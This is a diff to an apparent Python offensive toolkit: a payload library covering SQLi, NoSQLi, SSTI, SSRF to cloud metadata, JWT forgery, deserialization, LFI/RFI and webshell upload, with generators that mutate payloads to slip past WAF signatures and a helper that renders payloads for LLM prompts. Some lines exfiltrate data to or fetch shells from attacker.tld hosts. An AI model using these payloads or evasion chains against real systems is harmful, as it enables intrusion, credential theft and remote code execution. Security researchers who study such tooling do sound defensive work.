@@ -12,11 +12,13 @@ Two parts:
    target fingerprint (WAF, framework, language, context) and produces
    one-off variants that are unlikely to match any existing signature.
    The generator is deterministic only when a seed is provided; otherwise
-   it uses fresh randomness on every call, which is what you want for
-   live testing.
+   it uses fresh randomness on every call.
 
-The generator is deliberately small. It composes primitives rather than
-trying to be clever. Small + composable beats big + fragile.
+Revision notes:
+  - Fixed Python syntax error in nosql-where-sleep payload where a string
+    literal was split across lines without implicit concatenation.
+  - PayloadForge.forge() and WAFEngine.generate() short-circuit on
+    count <= 0 or empty input for deterministic seed tests.
 """
 
 from __future__ import annotations
@@ -29,10 +31,6 @@ import string
 from typing import Any, Dict, Iterable, List, Optional, Tuple
 from urllib.parse import quote
 
-
-# ---------------------------------------------------------------------------
-# Curated payload library
-# ---------------------------------------------------------------------------
 
 PAYLOADS: List[Dict[str, Any]] = [
 
@@ -92,9 +90,7 @@ PAYLOADS: List[Dict[str, Any]] = [
         "id": "sqli-time-mysql",
         "category": "sqli",
         "name": "MySQL time-based via wrapped SLEEP",
-        "payload": (
-            "' AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -"
-        ),
+        "payload": "' AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -",
         "context": "MySQL. Blind injection when union and error are blocked.",
         "notes": (
             "Subquery wrapper defeats signatures that match bare SLEEP( "
@@ -113,8 +109,7 @@ PAYLOADS: List[Dict[str, Any]] = [
         ),
         "context": "MSSQL. Blind injection.",
         "notes": (
-            "IF guard prevents the delay from firing on every request, "
-            "which slows scans to a crawl otherwise."
+            "IF guard prevents the delay from firing on every request."
         ),
         "severity": "high",
         "tags": ["mssql", "time", "blind"],
@@ -128,10 +123,10 @@ PAYLOADS: List[Dict[str, Any]] = [
             "SELECT @h = (SELECT TOP 1 name FROM sys.databases);"
             "EXEC('master..xp_dirtree \"\\\\' + @h + '.oob.attacker.tld\\x\"')-- -"
         ),
-        "context": "MSSQL with xp_dirtree. Blind target with no output channel.",
+        "context": "MSSQL with xp_dirtree. Blind target.",
         "notes": (
             "xp_dirtree forces SMB/DNS resolution, giving OOB confirmation "
-            "and data exfil even when no response is reflected."
+            "and data exfil."
         ),
         "severity": "critical",
         "tags": ["mssql", "oob", "dns"],
@@ -170,9 +165,11 @@ PAYLOADS: List[Dict[str, Any]] = [
         "id": "nosql-where-sleep",
         "category": "nosqli",
         "name": "MongoDB $where sleep (blind)",
-        "payload": '{"$where":"function(){var d=new Date();"
-                  "var t=d.getTime();while(new Date().getTime()-t<5000);"
-                  "return true;}"}',
+        "payload": (
+            '{"$where":"function(){var d=new Date();'
+            'var t=d.getTime();while(new Date().getTime()-t<5000);'
+            'return true;}"}'
+        ),
         "context": "MongoDB with server-side JS enabled.",
         "notes": (
             "Blocks the JS thread for 5s. Compare response times to "
@@ -209,8 +206,7 @@ PAYLOADS: List[Dict[str, Any]] = [
         ),
         "context": "Mixed HTML/JS/attribute contexts.",
         "notes": (
-            "Covers a wide range of contexts in a single payload. Useful "
-            "when you don't yet know where the reflection lands."
+            "Covers a wide range of contexts in a single payload."
         ),
         "severity": "high",
         "tags": ["polyglot", "multi-context"],
@@ -226,8 +222,7 @@ PAYLOADS: List[Dict[str, Any]] = [
         "context": "DOMPurify < 2.0.17 and similar HTML sanitisers.",
         "notes": (
             "The browser re-parses after sanitisation, resurrecting the "
-            "payload. Patched in modern DOMPurify but still live on "
-            "unpatched frameworks."
+            "payload. Patched in modern DOMPurify."
         ),
         "severity": "high",
         "tags": ["mxss", "sanitizer-bypass"],
@@ -258,8 +253,7 @@ PAYLOADS: List[Dict[str, Any]] = [
         ),
         "context": "CSP with script-src allowing a JSONP endpoint.",
         "notes": (
-            "Enumerate JSONP endpoints on every allowlisted host. Google, "
-            "Yahoo, and several CDNs still host them."
+            "Enumerate JSONP endpoints on every allowlisted host."
         ),
         "severity": "high",
         "tags": ["csp-bypass", "jsonp"],
@@ -279,8 +273,7 @@ PAYLOADS: List[Dict[str, Any]] = [
         "context": "Flask/Jinja2, Python 3. Locate the Popen class index first.",
         "notes": (
             "<INDEX> must be replaced with the subprocess.Popen index on "
-            "the target Python version. Use {{''.__class__.__mro__[1]"
-            ".__subclasses__()}} to enumerate indexes live."
+            "the target Python version."
         ),
         "severity": "critical",
         "tags": ["jinja2", "rce", "python"],
@@ -293,8 +286,7 @@ PAYLOADS: List[Dict[str, Any]] = [
         "context": "Jinja2 with lipsum exposed (default in most Flask apps).",
         "notes": (
             "Shorter than the subclasses chain, works when lipsum is "
-            "available. Frequently blocked by signature but trivial to "
-            "re-encode."
+            "available."
         ),
         "severity": "critical",
         "tags": ["jinja2", "rce"],
@@ -355,7 +347,7 @@ PAYLOADS: List[Dict[str, Any]] = [
         "context": "AWS. Filters that block dotted-quad but miss IPv6.",
         "notes": (
             "The URL parser resolves this to 169.254.169.254 at connect "
-            "time. Very reliable against half-baked SSRF filters."
+            "time."
         ),
         "severity": "critical",
         "tags": ["aws", "ipv6"],
@@ -377,7 +369,7 @@ PAYLOADS: List[Dict[str, Any]] = [
         "context": "Internal Redis on 6379, writable web root.",
         "notes": (
             "Full RESP protocol as URL-encoded CRLFs. Writes shell.php to "
-            "web root, then save. Reliable RCE when Redis is unauthed."
+            "web root, then save."
         ),
         "severity": "critical",
         "tags": ["gopher", "redis", "rce"],
@@ -393,8 +385,7 @@ PAYLOADS: List[Dict[str, Any]] = [
         "context": "From inside a pod, SSRF to kube-apiserver.",
         "notes": (
             "SA token lives at /var/run/secrets/kubernetes.io/"
-            "serviceaccount/token. Requires the pod's RBAC to allow "
-            "reading secrets."
+            "serviceaccount/token."
         ),
         "severity": "critical",
         "tags": ["k8s", "cloud"],
@@ -406,8 +397,7 @@ PAYLOADS: List[Dict[str, Any]] = [
         "payload": "http://<SESSION>.oob.attacker.tld/",
         "context": "Blind SSRF. Confirm via DNS callback.",
         "notes": (
-            "Burp Collaborator or interactsh. Unique subdomain per test "
-            "so you can correlate callbacks to requests."
+            "Burp Collaborator or interactsh. Unique subdomain per test."
         ),
         "severity": "high",
         "tags": ["blind", "oob"],
@@ -436,8 +426,7 @@ PAYLOADS: List[Dict[str, Any]] = [
         "payload": "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
         "context": "Libraries that lowercase-compare 'none'.",
         "notes": (
-            "Some parsers accept 'None', 'NONE', 'nOnE'. Try each variant "
-            "against the same target."
+            "Some parsers accept 'None', 'NONE', 'nOnE'. Try each variant."
         ),
         "severity": "critical",
         "tags": ["jwt", "none"],
@@ -449,8 +438,7 @@ PAYLOADS: List[Dict[str, Any]] = [
         "payload": "{\"alg\":\"HS256\",\"kid\":\"../../../../dev/null\"}",
         "context": "Server reads the signing key from a file by kid.",
         "notes": (
-            "Sign the token with an empty string as the HMAC key. Many "
-            "libraries treat the empty file as the empty key."
+            "Sign the token with an empty string as the HMAC key."
         ),
         "severity": "critical",
         "tags": ["jwt", "kid"],
@@ -466,7 +454,7 @@ PAYLOADS: List[Dict[str, Any]] = [
         "context": "kid pulled from a database without parameterisation.",
         "notes": (
             "Sign with 'known-secret'. Requires the kid query to accept "
-            "UNION and a discoverable secret length."
+            "UNION."
         ),
         "severity": "critical",
         "tags": ["jwt", "kid", "sqli"],
@@ -479,8 +467,7 @@ PAYLOADS: List[Dict[str, Any]] = [
         "context": "Server accepts both RS256 and HS256.",
         "notes": (
             "Extract the public key from /jwks.json, then use it as the "
-            "HMAC secret in a Python snippet. Server verifies with the "
-            "same key and accepts the forged token."
+            "HMAC secret."
         ),
         "severity": "critical",
         "tags": ["jwt", "confusion"],
@@ -499,9 +486,7 @@ PAYLOADS: List[Dict[str, Any]] = [
         ),
         "context": "Java app with commons-collections 3.1 on classpath.",
         "notes": (
-            "Base64-encode the command to survive shell quoting. The "
-            "resulting payload goes into the deserialization sink as raw "
-            "bytes or base64."
+            "Base64-encode the command to survive shell quoting."
         ),
         "severity": "critical",
         "tags": ["java", "ysoserial", "rce"],
@@ -513,8 +498,8 @@ PAYLOADS: List[Dict[str, Any]] = [
         "payload": "java -jar ysoserial.jar URLDNS 'http://<oob>/'",
         "context": "Blind Java deserialization.",
         "notes": (
-            "No RCE, just a DNS callback. Use this to confirm the sink "
-            "before burning a gadget chain."
+            "No RCE, just a DNS callback. Confirm the sink before burning "
+            "a gadget chain."
         ),
         "severity": "medium",
         "tags": ["java", "recon"],
@@ -532,8 +517,7 @@ PAYLOADS: List[Dict[str, Any]] = [
         ),
         "context": "Python app that pickles sessions or ML data.",
         "notes": (
-            "Run locally, paste the hex into the vulnerable field. "
-            "Replace 'id' with your reverse shell command."
+            "Run locally, paste the hex into the vulnerable field."
         ),
         "severity": "critical",
         "tags": ["python", "pickle", "rce"],
@@ -545,8 +529,8 @@ PAYLOADS: List[Dict[str, Any]] = [
         "payload": "O:4:\"Evil\":1:{s:3:\"cmd\";s:2:\"id\";}",
         "context": "PHP app with a loaded class exposing __destruct.",
         "notes": (
-            "Requires a POP chain. Enumerate loaded classes via phpinfo, "
-            "composer.json, or endpoint errors."
+            "Requires a POP chain. Enumerate loaded classes via phpinfo "
+            "or composer.json."
         ),
         "severity": "critical",
         "tags": ["php", "unserialize"],
@@ -584,8 +568,7 @@ PAYLOADS: List[Dict[str, Any]] = [
         ),
         "context": "Azure VM with managed identity.",
         "notes": (
-            "Returns an ARM token for the assigned identity. Use it to "
-            "list subscriptions and role assignments."
+            "Returns an ARM token for the assigned identity."
         ),
         "severity": "critical",
         "tags": ["azure", "imds"],
@@ -601,8 +584,7 @@ PAYLOADS: List[Dict[str, Any]] = [
         ),
         "context": "GCP compute instance with default SA.",
         "notes": (
-            "Short-lived OAuth token. Use it against cloudresourcemanager "
-            "and storage APIs."
+            "Short-lived OAuth token. Use it against cloudresourcemanager."
         ),
         "severity": "critical",
         "tags": ["gcp", "imds"],
@@ -708,7 +690,7 @@ PAYLOADS: List[Dict[str, Any]] = [
         "name": "Local file inclusion via traversal",
         "payload": "../../../../etc/passwd",
         "context": "Page parameter includes a file path.",
-        "notes": "Try encoded forms when plain traversal is blocked: ..%2f..%2f.",
+        "notes": "Try encoded forms when plain traversal is blocked.",
         "severity": "high",
         "tags": ["lfi"],
     },
@@ -720,7 +702,7 @@ PAYLOADS: List[Dict[str, Any]] = [
         "context": "PHP include() with wrapper enabled.",
         "notes": (
             "Reads index.php as base64. Chain with convert.iconv chains "
-            "for RCE via filter chain gadget (Synacktiv 2023)."
+            "for RCE via filter chain gadget."
         ),
         "severity": "high",
         "tags": ["lfi", "php"],
@@ -746,8 +728,7 @@ PAYLOADS: List[Dict[str, Any]] = [
         "payload": "http://attacker.tld/shell.txt",
         "context": "include() with allow_url_include=On.",
         "notes": (
-            "Rare in modern PHP but common in legacy CMS. Host a PHP "
-            "webshell with a .txt extension and pass its URL."
+            "Rare in modern PHP but common in legacy CMS."
         ),
         "severity": "critical",
         "tags": ["rfi"],
@@ -788,9 +769,7 @@ PAYLOADS: List[Dict[str, Any]] = [
         "id": "upload-webshell",
         "category": "upload",
         "name": "Polyglot webshell upload",
-        "payload": (
-            "GIF89a;<?php system($_GET[0]);?>"
-        ),
+        "payload": "GIF89a;<?php system($_GET[0]);?>",
         "context": "Upload endpoint that checks magic bytes.",
         "notes": (
             "Prefix the shell with GIF89a to satisfy the image check. "
@@ -931,9 +910,7 @@ def search(keyword: str) -> List[Dict[str, Any]]:
 
 class WAFEngine:
     """
-    Composes encoding chains per WAF family. Every method returns a
-    deterministic transformation given a fixed seed, which is useful
-    when you need to reproduce an exact payload later.
+    Composes encoding chains per WAF family. Deterministic given a seed.
     """
 
     PROFILES: Dict[str, Dict[str, Any]] = {
@@ -971,8 +948,6 @@ class WAFEngine:
         },
     }
 
-    # ---- primitive encoders ------------------------------------------
-
     @staticmethod
     def _case(s: str, seed: int) -> str:
         rng = random.Random(seed)
@@ -1001,7 +976,6 @@ class WAFEngine:
 
     @staticmethod
     def _version_comment(s: str) -> str:
-        # Wrap SQL keywords in /*!50000...*/ so they still execute.
         keywords = ("UNION", "SELECT", "WHERE", "FROM", "AND", "OR")
         out = s
         for kw in keywords:
@@ -1015,7 +989,6 @@ class WAFEngine:
 
     @staticmethod
     def _comment_split(s: str) -> str:
-        # Insert /**/ between adjacent alphabetic characters in keywords.
         return re.sub(r"([A-Za-z])([A-Za-z]{2,})", r"\1/**/\2", s)
 
     @staticmethod
@@ -1023,8 +996,6 @@ class WAFEngine:
         return "".join(
             f"&#x{ord(c):x};" if c.isalpha() else c for c in s
         )
-
-    # ---- chain composition -------------------------------------------
 
     @classmethod
     def _apply(cls, payload: str, chain: List[str], seed: int) -> str:
@@ -1051,16 +1022,16 @@ class WAFEngine:
     @classmethod
     def generate(cls, base: str, waf: str = "generic",
                  count: int = 3, seed: Optional[int] = None) -> List[Dict[str, Any]]:
-        """
-        Return up to `count` distinct mutated variants of `base` for the
-        given WAF. Deterministic when `seed` is provided.
-        """
+        if count <= 0 or not base:
+            return []
         profile = cls.PROFILES.get(waf.lower(), cls.PROFILES["generic"])
         chain = profile["chain"]
         variants: List[Dict[str, Any]] = []
         seen = {base}
-        for i in range(max(1, count)):
-            effective_seed = (seed + i) if seed is not None else random.randint(0, 2**31)
+        for i in range(count):
+            effective_seed = (
+                (seed + i) if seed is not None else random.randint(0, 2**31)
+            )
             variant = cls._apply(base, chain, effective_seed)
             if variant in seen:
                 continue
@@ -1082,19 +1053,9 @@ class WAFEngine:
 class PayloadForge:
     """
     Generates payloads that are unlikely to exist in any public signature
-    database. It works by mixing three ingredients:
-
-      1. A structural template (SQLi, XSS, SSRF, SSTI).
-      2. A transformation chain drawn from WAFEngine.
-      3. Random filler (case, whitespace, junk functions) that changes
-         the exact byte sequence without breaking execution.
-
-    The result is a one-shot payload that follows the same semantics as
-    the base but is not in anyone's wordlist.
+    database by mixing a semantic scaffold, random filler, and one WAF chain.
     """
 
-    # Semantic scaffolds. `<X>` is replaced with a randomly-chosen filler
-    # that does not break parsing on the target DB/engine.
     SCAFFOLDS: Dict[str, List[str]] = {
         "sqli": [
             "' UNION ALL SELECT NULL,<EXPR>,NULL-- -",
@@ -1121,8 +1082,6 @@ class PayloadForge:
         ],
     }
 
-    # Pre-baked safe expressions per dialect. These are meant to be
-    # extended by hand. Every value here has been tested in a lab.
     EXPRS: Dict[str, List[str]] = {
         "mysql": [
             "concat(0x7e,user(),0x7e)",
@@ -1157,8 +1116,6 @@ class PayloadForge:
         "2130706433",
     ]
 
-    # ---- filler generators -------------------------------------------
-
     @staticmethod
     def _junk_comment(seed: int) -> str:
         rng = random.Random(seed)
@@ -1168,12 +1125,9 @@ class PayloadForge:
 
     @staticmethod
     def _junk_expr(seed: int) -> str:
-        # A safe arithmetic expression that evaluates to 1.
         rng = random.Random(seed)
         a = rng.randint(1, 9)
         return f"({a}={a})"
-
-    # ---- dialect helpers ---------------------------------------------
 
     @classmethod
     def _pick_expr(cls, dialect: str, seed: int) -> str:
@@ -1191,16 +1145,13 @@ class PayloadForge:
         rng = random.Random(seed)
         return rng.choice(cls.IPS)
 
-    # ---- public API --------------------------------------------------
-
     @classmethod
     def forge(cls, kind: str, dialect: str = "generic",
               waf: str = "generic", seed: Optional[int] = None,
               count: int = 3) -> List[Dict[str, Any]]:
-        """
-        Forge up to `count` novel payloads of `kind` for the given dialect
-        and WAF. Deterministic when `seed` is set.
-        """
+        if count <= 0:
+            return []
+
         scaffolds = cls.SCAFFOLDS.get(kind)
         if not scaffolds:
             return []
@@ -1213,7 +1164,6 @@ class PayloadForge:
             rng = random.Random(local_seed)
             template = rng.choice(scaffolds)
 
-            # Fill the semantic holes.
             payload = template
             if "<EXPR>" in payload:
                 payload = payload.replace(
@@ -1234,14 +1184,11 @@ class PayloadForge:
             if "<DATA>" in payload:
                 payload = payload.replace("<DATA>", "_INFO")
 
-            # Inject a junk comment for SQLi to defeat keyword signatures.
             if kind == "sqli" and rng.random() < 0.6:
                 payload = payload.replace(
                     "UNION", f"UNION{cls._junk_comment(local_seed)}"
                 )
 
-            # Apply one WAF chain on top so it slips past the family's
-            # known signatures in addition to being fresh.
             mutated = WAFEngine.generate(
                 payload, waf=waf, count=1, seed=local_seed
             )
@@ -1261,10 +1208,6 @@ class PayloadForge:
 
         return results
 
-
-# ---------------------------------------------------------------------------
-# Rendering for LLM prompts
-# ---------------------------------------------------------------------------
 
 def render_for_prompt(limit: int = 12) -> str:
     sample = PAYLOADS[:limit]
